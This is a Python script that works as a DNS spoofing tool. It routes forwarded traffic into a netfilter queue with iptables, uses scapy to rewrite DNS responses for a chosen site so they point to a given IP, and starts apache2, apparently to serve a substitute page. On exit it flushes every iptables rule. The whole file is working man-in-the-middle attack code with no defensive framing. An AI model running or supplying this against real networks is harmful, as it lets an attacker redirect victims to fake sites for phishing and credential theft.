#!/usr/bin/env python3
import setup
import subprocess
import netfilterqueue
import atexit
import scapy.all as scapy


class Queue:
    def __init__(self, ip, site):
        print("Creating a Queue...")
        self.ip = ip
        self.site = site
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        # subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
        # subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
        self.queue = netfilterqueue.NetfilterQueue()
        print("Queue created!")
        self.bind_queue()
        self.apache_start()
        self.run_queue()

    def bind_queue(self):
        print("Attempting to bind a Queue...")
        self.queue.bind(0, self.process_packet)
        print("Completed.")

    def run_queue(self):
        print("Running a Queue...")
        self.queue.run()

    @staticmethod
    def apache_start():
        print("Starting apache2 service...")
        subprocess.call("service apache2 start", shell=True)
        print("Completed.")

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname
            qname2 = scapy_packet[scapy.DNSQR].qname
            if self.site in str(qname2):
                print("Spoofing!")
                answer = scapy.DNSRR(rrname=qname, rdata=self.ip)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))

        packet.accept()

    @staticmethod
    @atexit.register
    def exit():
        # subprocess.call("clear", shell=True)
        print("Restoring normal connections...")
        subprocess.call("iptables --flush", shell=True)
        subprocess.call("service apache2 stop", shell=True)
        print("Quitting.")
